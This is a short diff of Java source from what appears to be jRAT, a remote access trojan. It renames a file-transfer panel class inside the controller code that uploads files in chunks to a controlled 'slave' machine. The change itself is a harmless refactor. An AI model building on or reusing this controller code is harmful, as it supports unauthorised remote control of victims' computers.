@@ -5,7 +5,7 @@ import java.io.File;
 import java.io.FileInputStream;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.panels.PanelFileTransfer;
+import se.jrat.client.ui.panels.PanelFileTransfers;
 import se.jrat.common.TransferRunnable;
 import se.jrat.common.io.TransferData;
 
@@ -27,7 +27,7 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 		
 		if (file.exists() && file.isFile()) {
 			TransferData data = new TransferData();
-			PanelFileTransfer.instance.add(data);
+			PanelFileTransfers.instance.add(data);
 			data.setRemoteFile(remoteFile);
 			data.setLocalFile(file);
 			data.setTotal(file.length());
@@ -58,7 +58,7 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 							slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
 														
 							data.increaseRead(read);
-							PanelFileTransfer.instance.update();
+							PanelFileTransfers.instance.update();
 						}
 						
 						fileInput.close();
